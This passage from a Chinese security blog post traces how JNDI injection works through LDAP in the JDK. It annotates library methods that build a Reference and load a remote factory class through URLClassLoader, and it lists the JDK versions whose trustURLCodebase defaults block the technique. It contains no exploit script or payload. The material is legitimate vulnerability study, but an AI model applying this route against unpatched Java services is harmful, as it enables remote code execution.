<p><code>LADP</code>服务利用流程分析，<code>LADP</code>服务前面的调用流程和<code>jndi</code>是基本一样，从<code>Obj</code>类的<code>decodeObject</code>方法这里就有些不太一样了，<code>decodeObject</code>方法内部调用了<code>decodeReference</code>方法<br>跟进<code>com.sun.jndi.ldap.Obj.java#decodeObject</code>，按照该函数的注释来看，其主要功能是解码从<code>LDAP Server</code>来的对象，该对象可能是序列化的对象，也可能是一个<code>Reference</code>对象。关于序列化对象的处理，我们看后面一节。这里摘取了<code>Reference</code>的处理方式：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">static</span> Object <span class="hljs-title function_">decodeObject</span><span class="hljs-params">(Attributes var0)</span> <span class="hljs-keyword">throws</span> NamingException &#123;<br>    String[] var2 = getCodebases(var0.get(JAVA_ATTRIBUTES[<span class="hljs-number">4</span>]));<br><br>    <span class="hljs-keyword">try</span> &#123;<br>        Attribute var1;<br>        <span class="hljs-keyword">if</span> ((var1 = var0.get(JAVA_ATTRIBUTES[<span class="hljs-number">1</span>])) != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">var3</span> <span class="hljs-operator">=</span> helper.getURLClassLoader(var2);<br>            <span class="hljs-keyword">return</span> deserializeObject((<span class="hljs-type">byte</span>[])((<span class="hljs-type">byte</span>[])var1.get()), var3);<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ((var1 = var0.get(JAVA_ATTRIBUTES[<span class="hljs-number">7</span>])) != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">return</span> decodeRmiObject((String)var0.get(JAVA_ATTRIBUTES[<span class="hljs-number">2</span>]).get(), (String)var1.get(), var2);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            var1 = var0.get(JAVA_ATTRIBUTES[<span class="hljs-number">0</span>]);<br>            <span class="hljs-type">return</span> <span class="hljs-variable">var1</span> <span class="hljs-operator">=</span>= <span class="hljs-literal">null</span> || !var1.contains(JAVA_OBJECT_CLASSES[<span class="hljs-number">2</span>]) &amp;&amp; !var1.contains(JAVA_OBJECT_CLASSES_LOWER[<span class="hljs-number">2</span>]) ? <span class="hljs-literal">null</span> : decodeReference(var0, var2);<br>            <span class="hljs-comment">//此处调用的decodeReference方法</span><br>        &#125;<br>    &#125; <span class="hljs-keyword">catch</span> (IOException var5) &#123;<br>        <span class="hljs-type">NamingException</span> <span class="hljs-variable">var4</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">NamingException</span>();<br>        var4.setRootCause(var5);<br>        <span class="hljs-keyword">throw</span> var4;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p><code>Obj</code>类的<code>decodeReference</code>方法根据<code>Ldap</code>传入的<code>addAttribute</code>属性构造并返回了一个新的<code>reference</code>对象引用</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Reference <span class="hljs-title function_">decodeReference</span><span class="hljs-params">(Attributes var0, String[] var1)</span> <span class="hljs-keyword">throws</span> NamingException, IOException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">var4</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        Attribute var2;<br>        <span class="hljs-keyword">if</span> ((var2 = var0.get(JAVA_ATTRIBUTES[<span class="hljs-number">2</span>])) == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvalidAttributesException</span>(JAVA_ATTRIBUTES[<span class="hljs-number">2</span>] + <span class="hljs-string">&quot; attribute is required&quot;</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">var3</span> <span class="hljs-operator">=</span> (String)var2.get();<br>            <span class="hljs-keyword">if</span> ((var2 = var0.get(JAVA_ATTRIBUTES[<span class="hljs-number">3</span>])) != <span class="hljs-literal">null</span>) &#123;<br>                var4 = (String)var2.get();<br>            &#125;<br>            <span class="hljs-comment">//返回一个新的Reference对象引用</span><br>            <span class="hljs-type">Reference</span> <span class="hljs-variable">var5</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Reference</span>(var3, var4, var1 != <span class="hljs-literal">null</span> ? var1[<span class="hljs-number">0</span>] : <span class="hljs-literal">null</span>);<br>            <span class="hljs-comment">//获取第6个属性</span><br>            <span class="hljs-keyword">if</span> ((var2 = var0.get(JAVA_ATTRIBUTES[<span class="hljs-number">5</span>])) != <span class="hljs-literal">null</span>) &#123;<br>               <span class="hljs-comment">//省略部分代码</span><br>            &#125;<br>            <span class="hljs-comment">//直接返回reference对象</span><br>            <span class="hljs-keyword">return</span> var5;<br>        &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p><code>LADP</code>服务的<code>Reference</code>对象引用的获取和<code>jndi</code>注入中的不太一样，<code>jndi</code>是通过<code>ReferenceWrapper_Stub</code>对象的<code>getReference</code>方法获取<code>reference</code>对象，而<code>LADP</code>服务是根据传入的属性构造一个新的<code>reference</code>对象引用，接着获取了第6个属性并判断是否为空，如果第6个属性为<code>null</code>则直接返回新的<code>reference</code>对象引用。</p>
<p>在new一个Reference时，三个属性如下</p>
<p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303192036922.png" srcset="/Decemberus.github-io/img/loading.gif" lazyload alt="image-20230309212054690"> </p>
<p>接着会返回到<code>decodeObject</code>方法调用处，然后再返回到<code>LdapCtx</code>类的<code>c_lookup</code>方法调用处，接着往下执行调用<code>getObjectInstance</code>方法</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">getObjectInstance</span><span class="hljs-params">(Object refInfo, Name name, Context nameCtx , Hashtable&lt;?,?&gt; environment, Attributes attrs)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>           ObjectFactory factory;<br>           <span class="hljs-comment">//获取对象工厂</span><br>           <span class="hljs-type">ObjectFactoryBuilder</span> <span class="hljs-variable">builder</span> <span class="hljs-operator">=</span> getObjectFactoryBuilder();<br>           <span class="hljs-keyword">if</span> (builder != <span class="hljs-literal">null</span>) &#123;<br>               <span class="hljs-comment">// builder must return non-null factory</span><br>               factory = builder.createObjectFactory(refInfo, environment);<br>               <span class="hljs-keyword">if</span> (factory <span class="hljs-keyword">instanceof</span> DirObjectFactory) &#123;<br>                   <span class="hljs-keyword">return</span> ((DirObjectFactory)factory).getObjectInstance(<br>                       refInfo, name, nameCtx, environment, attrs);<br>               &#125; <span class="hljs-keyword">else</span> &#123;<br>                   <span class="hljs-keyword">return</span> factory.getObjectInstance(refInfo, name, nameCtx,<br>                       environment);<br>               &#125;<br>           &#125;<br><br>           <span class="hljs-comment">// use reference if possible</span><br>           <span class="hljs-type">Reference</span> <span class="hljs-variable">ref</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>           <span class="hljs-comment">//判断reference对象是否为Reference</span><br>           <span class="hljs-keyword">if</span> (refInfo <span class="hljs-keyword">instanceof</span> Reference) &#123;<br>                <span class="hljs-comment">//转换为Reference类型</span><br>               ref = (Reference) refInfo;<br>           &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (refInfo <span class="hljs-keyword">instanceof</span> Referenceable) &#123;<br>               ref = ((Referenceable)(refInfo)).getReference();<br>           &#125;<br><br>           Object answer;<br>           <span class="hljs-comment">//reference对象是否为空</span><br>           <span class="hljs-keyword">if</span> (ref != <span class="hljs-literal">null</span>) &#123;<br>               <span class="hljs-comment">//获取工厂类名Exp</span><br>               <span class="hljs-type">String</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> ref.getFactoryClassName();<br>               <span class="hljs-keyword">if</span> (f != <span class="hljs-literal">null</span>) &#123;<br>                   <span class="hljs-comment">// if reference identifies a factory, use exclusively</span><br>                   <span class="hljs-comment">//根据工厂类远程获取对象引用</span><br>                   factory = getObjectFactoryFromReference(ref, f);<br>                   <span class="hljs-keyword">if</span> (factory <span class="hljs-keyword">instanceof</span> DirObjectFactory) &#123;<br>                       <span class="hljs-keyword">return</span> ((DirObjectFactory)factory).getObjectInstance(<br>                           ref, name, nameCtx, environment, attrs);<br>                   &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (factory != <span class="hljs-literal">null</span>) &#123;<br>                       <span class="hljs-keyword">return</span> factory.getObjectInstance(ref, name, nameCtx,<br>                                                        environment);<br>                   &#125;<br>                   <span class="hljs-comment">// No factory found, so return original refInfo.</span><br>                   <span class="hljs-comment">// Will reach this point if factory class is not in</span><br>                   <span class="hljs-comment">// class path and reference does not contain a URL for it</span><br>                   <span class="hljs-keyword">return</span> refInfo;<br><br>               &#125; <span class="hljs-keyword">else</span> &#123;<br>                   <span class="hljs-comment">// if reference has no factory, check for addresses</span><br>                   <span class="hljs-comment">// containing URLs</span><br>                   <span class="hljs-comment">// ignore name &amp; attrs params; not used in URL factory</span><br><br>                   answer = processURLAddrs(ref, name, nameCtx, environment);<br>                   <span class="hljs-keyword">if</span> (answer != <span class="hljs-literal">null</span>) &#123;<br>                       <span class="hljs-keyword">return</span> answer;<br>                   &#125;<br>               &#125;<br>           &#125;<br><br>           <span class="hljs-comment">// try using any specified factories</span><br>           answer = createObjectFromFactories(refInfo, name, nameCtx,<br>                                              environment, attrs);<br>           <span class="hljs-keyword">return</span> (answer != <span class="hljs-literal">null</span>) ? answer : refInfo;<br><br>   &#125;<br></code></pre></td></tr></table></figure>

<p><code>getObjectInstance</code>方法将<code>reference</code>对象转换为<code>Reference</code>类型并判断<code>reference</code>对象是否为空，如果不为空则从<code>reference</code>引用中获取工厂类<code>Exp</code>名字，接着调用<code>getObjectFactoryFromReference</code>方法根据工厂类Exp名字获取远程调用对象。</p>
<p><code>getObjectFactoryFromReference</code>方法实现如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">static</span> ObjectFactory <span class="hljs-title function_">getObjectFactoryFromReference</span><span class="hljs-params">(Reference ref, String factoryName)</span> <span class="hljs-keyword">throws</span> IllegalAccessException,InstantiationException, MalformedURLException &#123;<br>    Class&lt;?&gt; clas = <span class="hljs-literal">null</span>;<br><br>    <span class="hljs-comment">// Try to use current class loader</span><br>    <span class="hljs-keyword">try</span> &#123;<br>         <span class="hljs-comment">//尝试先在本地加载Exp类</span><br>         clas = helper.loadClass(factoryName);<br>    &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException e) &#123;<br>        <span class="hljs-comment">// ignore and continue</span><br>        <span class="hljs-comment">// e.printStackTrace();</span><br>    &#125;<br>    <span class="hljs-comment">// All other exceptions are passed up.</span><br><br>    <span class="hljs-comment">// Not in class path; try to use codebase</span><br>    String codebase;<br>    <span class="hljs-comment">//获取远程地址</span><br>    <span class="hljs-keyword">if</span> (clas == <span class="hljs-literal">null</span> &amp;&amp; (codebase = ref.getFactoryClassLocation()) != <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">//loadClass方法远程加载Exp类</span><br>            clas = helper.loadClass(factoryName, codebase);<br>        &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException e) &#123;<br><br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> (clas != <span class="hljs-literal">null</span>) ? (ObjectFactory) clas.newInstance() : <span class="hljs-literal">null</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p><img src="D:/mdimage/e81b0bd5-336c-4141-8925-dc09a0ccfa3d.png" srcset="/Decemberus.github-io/img/loading.gif" lazyload alt="ldap_low6.png"> </p>
<p>可以看到<code>LDAP</code>服务跟<code>jndi</code>一样，会尝试先在本地查找加载<code>Exp</code>类，如果本地没有找到<code>Exp</code>类，那么<code>getFactoryClassLocation</code>方法会获取远程加载的<code>url</code>地址，如果不为空则根据远程<code>url</code>地址使用类加载器<code>URLClassLoader</code>来加载<code>Exp</code>类，通过分析发现<code>LDAP</code>服务的整个利用流程都没有<code>URLCodebase</code>限制。<br>看一下整个调用站栈</p>
<p><img src="D:/mdimage/b956cc02-77f5-47b0-91fb-b50bd619731e.png" srcset="/Decemberus.github-io/img/loading.gif" lazyload alt="ldap_low7.png"> </p>
<p><a target="_blank" rel="noopener" href="https://tttang.com/archive/1611/#toc__2">JNDI注入分析 - 跳跳糖 (tttang.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://paper.seebug.org/942/#2-rmi-jndi-reference-payload">如何绕过高版本 JDK 的限制进行 JNDI 注入利用 (seebug.org)</a></p>
<p>后面这块没搞明白了，挖个坑</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul>
<li><code>JDK 5U45</code>、<code>6U45</code>、<code>7u21</code>、<code>8u121</code> 开始 <code>java.rmi.server.useCodebaseOnly</code> 默认配置为<code>true</code></li>
<li><code>JDK 6u132</code>、<code>7u122</code>、<code>8u113</code> 开始 <code>com.sun.jndi.rmi.object.trustURLCodebase</code> 默认值为<code>false</code></li>
<li><code>JDK 11.0.1</code>、<code>8u191</code>、<code>7u201</code>、<code>6u211</code> 开始 <code>com.sun.jndi.ldap.object.trustURLCodebase</code> 默认为<code>false</code></li>
</ul>
<p>由于<code>JNDI</code>注入动态加载的原理是使用<code>Reference</code>引用<code>Object Factory</code>类，其内部在上文中也分析到了使用的是<code>URLClassLoader</code>，所以不受<code>java.rmi.server.useCodebaseOnly=false</code>属性的限制。<br>但是不可避免的受到 <code>com.sun.jndi.rmi.object.trustURLCodebase</code>、<code>com.sun.jndi.cosnaming.object.trustURLCodebase</code>的限制。</p>
<p>所以，<code>JNDI-RMI</code>注入方式有： <code>codebase</code>(<code>JDK 6u132</code>、<code>7u122</code>、<code>8u113</code>之前可以)  </p>
<p>利用本地<code>Class Factory</code>作为<code>Reference Factory</code></p>
<p><code>JNDI-LDAP</code>注入方式： <code>codebase</code>(<code>JDK 11.0.1</code>、<code>8u191</code>、<code>7u201</code>、<code>6u211</code>之前可以) </p>
<p> <code>serialize</code>（两个切入点）</p>

              
            </div>
            <hr/>
            <div>
              <div class="post-metas my-3">
  
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>JNDI注入分析</div>
      <div>https://decemberus.github.io/Decemberus.github-io/2022/12/19/JNDI注入分析/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>作者</div>
          <div>Decemberus</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2022年12月19日</div>
        </div>
      
      
      <div class="license-meta-item">
        <div>许可协议</div>
        <div>
          
            
            
              <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
              <span class="hint--top hint--rounded" aria-label="BY - 署名">
                <i class="iconfont icon-by"></i>
              </span>
              </a>
            
          
        </div>
      </div>
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/Decemberus.github-io/2023/01/01/Java%E4%B8%AD%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81%E7%9A%84%E6%96%B9%E6%B3%95/" title="Java中动态加载字节码的方法">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">Java中动态加载字节码的方法</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/Decemberus.github-io/2022/12/16/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8D%8F%E8%AE%AE%E6%9E%84%E9%80%A0%E4%B8%8E%E5%88%86%E6%9E%90/" title="Java反序列化协议构造与分析">
                        <span class="hidden-mobile">Java反序列化协议构造与分析</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  






    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
    </div>
  
  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/Decemberus.github-io/js/events.js" ></script>
<script  src="/Decemberus.github-io/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>






  
    <script  src="/Decemberus.github-io/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.0/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      headingSelector : CONFIG.toc.headingSelector || 'h1,h2,h3,h4,h5,h6',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      collapseDepth   : CONFIG.toc.collapseDepth || 0,
      scrollSmooth    : true,
      headingsOffset  : -boardTop
    });
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }
  });
</script>


  <script>
  (function() {
    var enableLang = CONFIG.code_language.enable && CONFIG.code_language.default;
    var enableCopy = CONFIG.copy_btn;
    if (!enableLang && !enableCopy) {
      return;
    }

    function getBgClass(ele) {
      return Fluid.utils.getBackgroundLightness(ele) >= 0 ? 'code-widget-light' : 'code-widget-dark';
    }

    var copyTmpl = '';
    copyTmpl += '<div class="code-widget">';
    copyTmpl += 'LANG';
    copyTmpl += '</div>';
    jQuery('.markdown-body pre').each(function() {
      var $pre = jQuery(this);
      if ($pre.find('code.mermaid').length > 0) {
        return;
      }
      if ($pre.find('span.line').length > 0) {
        return;
      }

      var lang = '';

      if (enableLang) {
        lang = CONFIG.code_language.default;
        if ($pre[0].children.length > 0 && $pre[0].children[0].classList.length >= 2 && $pre.children().hasClass('hljs')) {
          lang = $pre[0].children[0].classList[1];
        } else if ($pre[0].getAttribute('data-language')) {
          lang = $pre[0].getAttribute('data-language');
        } else if ($pre.parent().hasClass('sourceCode') && $pre[0].children.length > 0 && $pre[0].children[0].classList.length >= 2) {
          lang = $pre[0].children[0].classList[1];
          $pre.parent().addClass('code-wrapper');
        } else if ($pre.parent().hasClass('markdown-body') && $pre[0].classList.length === 0) {
          $pre.wrap('<div class="code-wrapper"></div>');
        }
        lang = lang.toUpperCase().replace('NONE', CONFIG.code_language.default);
      }
      $pre.append(copyTmpl.replace('LANG', lang).replace('code-widget">',
        getBgClass($pre[0]) + (enableCopy ? ' code-widget copy-btn" data-clipboard-snippet><i class="iconfont icon-copy"></i>' : ' code-widget">')));

      if (enableCopy) {
        Fluid.utils.createScript('https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js', function() {
          var clipboard = new window.ClipboardJS('.copy-btn', {
            target: function(trigger) {
              var nodes = trigger.parentNode.childNodes;
              for (var i = 0; i < nodes.length; i++) {
                if (nodes[i].tagName === 'CODE') {
                  return nodes[i];
                }
              }
            }
          });
          clipboard.on('success', function(e) {
            e.clearSelection();
            e.trigger.innerHTML = e.trigger.innerHTML.replace('icon-copy', 'icon-success');
            setTimeout(function() {
              e.trigger.innerHTML = e.trigger.innerHTML.replace('icon-success', 'icon-copy');
            }, 2000);
          });
        });
      }
    });
  })();
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script  src="/Decemberus.github-io/js/local-search.js" ></script>





<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/Decemberus.github-io/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
</body>
</html>
